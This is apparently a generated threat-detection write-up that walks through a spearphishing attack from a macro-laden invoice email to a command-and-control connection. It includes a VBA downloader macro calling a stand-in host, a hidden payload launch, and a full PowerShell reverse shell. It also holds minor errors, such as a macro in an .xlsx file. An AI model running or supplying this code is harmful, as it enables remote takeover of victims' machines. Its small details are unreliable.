<output>
Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario involves an attacker sending a spearphishing email with a malicious attachment. The user opens the attachment, which executes a macro that downloads and executes a payload. The attack leverages multiple applications, including Outlook for email, Excel for the malicious attachment, and PowerShell for executing the payload.

Attack Flow Breakdown:

1. **Initial Access via Email**
   - **Application Involved**: Outlook
   - **User Action**: The user receives an email with a subject line "Invoice Attached" and opens it.
   - **Key Artifacts**: Email headers, subject line, sender's email address.
   - **Detection Focus**: Monitor for emails with suspicious attachments or links, especially from unknown senders.

2. **Opening the Malicious Attachment**
   - **Application Involved**: Microsoft Excel
   - **User Action**: The user opens the attached Excel file named "Invoice.xlsx".
   - **Key Artifacts**: Excel file with macros enabled.
   - **Detection Focus**: Track the opening of Excel files with macros, especially those that are downloaded from email.

3. **Execution of Malicious Macro**
   - **Application Involved**: Microsoft Excel
   - **User Action**: The user enables macros when prompted by Excel.
   - **Key Artifacts**: VBA script within the Excel file that downloads a payload.
   - **Detection Focus**: Monitor for macro execution events and analyze the VBA code for suspicious commands (e.g., `Shell`, `CreateObject`).

   ```vba
   ' Example of a malicious macro that downloads a payload
   Sub Auto_Open()
       Dim objHTTP As Object
       Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
       objHTTP.Open "GET", "http://malicious-url.com/payload.exe", False
       objHTTP.Send
       ' Save the payload to disk
       Dim stream As Object
       Set stream = CreateObject("ADODB.Stream")
       stream.Type = 1 ' Binary
       stream.Open
       stream.Write objHTTP.responseBody
       stream.SaveToFile "C:\Users\Public\payload.exe", 2 ' Overwrite if exists
       stream.Close
       ' Execute the payload
       Shell "C:\Users\Public\payload.exe", vbHide
   End Sub
   ```

4. **Payload Execution**
   - **Application Involved**: PowerShell
   - **User Action**: The macro executes the downloaded payload, which is a malicious executable.
   - **Key Artifacts**: Executable file created in the public directory.
   - **Detection Focus**: Monitor for the execution of newly created executables, especially those initiated by Excel or PowerShell.

   ```powershell
   # Command to execute the downloaded payload
   Start-Process "C:\Users\Public\payload.exe" -WindowStyle Hidden
   ```

5. **Post-Exploitation Activities**
   - **Application Involved**: PowerShell
   - **User Action**: The payload establishes a reverse shell or connects to a command and control (C2) server.
   - **Key Artifacts**: Network connections to suspicious IP addresses or domains.
   - **Detection Focus**: Analyze outbound network traffic for connections to known malicious IPs or domains.

   ```powershell
   # Example of a reverse shell command
   $client = New-Object System.Net.Sockets.TCPClient("malicious-c2.com", 4444);
   $stream = $client.GetStream();
   [byte[]]$bytes = 0..65535|%{0};
   while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
       $data = (New-Object -ComObject System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
       $sendback = (iex $data 2>&1 | Out-String );
       $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
       $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
       $stream.Write($sendbyte, 0, $sendbyte.Length);
       $stream.Flush();
   }
   ```

</output>